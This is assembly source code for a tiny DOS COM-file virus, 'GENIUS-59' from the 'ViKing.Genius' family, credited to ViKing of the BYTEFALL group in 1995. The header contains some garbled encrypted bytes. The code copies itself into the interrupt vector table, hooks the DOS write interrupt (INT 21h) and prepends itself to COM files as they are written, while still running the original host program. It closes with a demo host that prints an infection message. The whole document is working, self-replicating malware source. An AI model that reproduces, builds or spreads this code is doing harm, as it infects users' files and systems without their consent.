   ;Virus from ViKing.Genius family
   ;Virus GENIUS-59 - The Champion of smallest class in the World.
   ;CopyWrited (c) by ViKing in 1995
   ;ViKing is a member of BYTEFALL Group
   ;Crypted Here->|{HPóúf.{LM_áã±ƒ]–o½¿„˜°Ÿx1)PT[Ç3ü*|  !G°ï‚µ”X¦<¼ÅžÓ
   ;Crypted Here->d`BùE£'v{vÕýô‹8*øCô*ÙñÐ
   ;----------------------------------------------------------------------
   .model tiny
   .code
   .286
   ;----------------------------------------------------------------------
   LoaderSize      equ     offset NewInt - offset Start
   VirusSize       equ     offset END_OF_VIR - offset Start
   INT_NUM         equ     (LoaderSize*10h + VirusSize) /4
   ;----------------------------------------------------------------------
                   org     100h

   Start:
                   cli                             ;Specially For int 9,8,1C...
   ;                pusha
                   push    si                      ;SI=IP=100h

                   scasw                           ;DI=SP=FFFEh => DI=0
                   mov     al,LoaderSize
                   mov     bl,84h - VirusSize
                   mov     es,ax
                   mov     cl,VirusSize
                   rep     movsb                   ;Move VirusBody to IntTable

                   mov     ds,cx
                   xchg    ax,[di+bx]              ;Set int 21h
                   cmp     al,LoaderSize
                   jz      CureOwner
                   stosw
                   mov     ax,es
                   xchg    ax,[di+bx]
                   stosw
   CureOwner:
                   push    cs
                   pop     es

                   push    cs
                   pop     ds

                   pop     di                      ;DI=Old SI=100h
                   sub     cx,si                   ;CX=0,SI=END_OF_VIR=>CX=OwnerSize

                   rep     movsb                   ;Move OwnerBody to 100h
   ;                popa
   ;                sti
                   jmp     short Start

   NewInt:
                   pusha
                   mov     si,dx                   ;Is WriteBuff consisted of
                   lodsb                           ;COM-file start?
                   cmp     ax,40E9h                ;Write-func of int 21h?
                   jne     ExitFromInt

                   push    ds                      ;Write VirusBody
                   push    cs
                   pop     ds
                   cwd
                   mov     cx,VirusSize
   ;                int     INT_NUM
                   int     21h                     ;Sorry... Can clear stack
                   pop     ds                      ;2 pusha are too much...
                   ;AND then... Write OwnerBody.
   ExitFromInt:
                   popa
                   DB      0EAh

   END_OF_VIR:
   ;----------------------------------------------------------------------
   ;Owner Body
                   mov     dx,offset String - VirusSize
                   mov     ah,9
                   int     21h
                   retn
   String          db      "Pay Attention !!! This file is infected by ViKing.Genius virus...$"
   ;----------------------------------------------------------------------
                   end Start
